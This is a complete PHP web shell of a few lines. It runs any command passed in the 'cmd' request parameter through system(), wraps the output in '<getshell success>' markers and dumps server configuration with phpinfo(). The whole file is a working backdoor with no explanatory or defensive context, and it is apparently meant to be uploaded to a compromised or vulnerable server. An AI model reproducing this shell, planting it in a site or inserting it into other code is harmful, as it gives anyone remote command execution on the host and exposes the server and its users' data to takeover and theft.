<?php
if(isset($_REQUEST['cmd'])){
        echo "<getshell success>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "<getshell success>";
        phpinfo();
}
?>
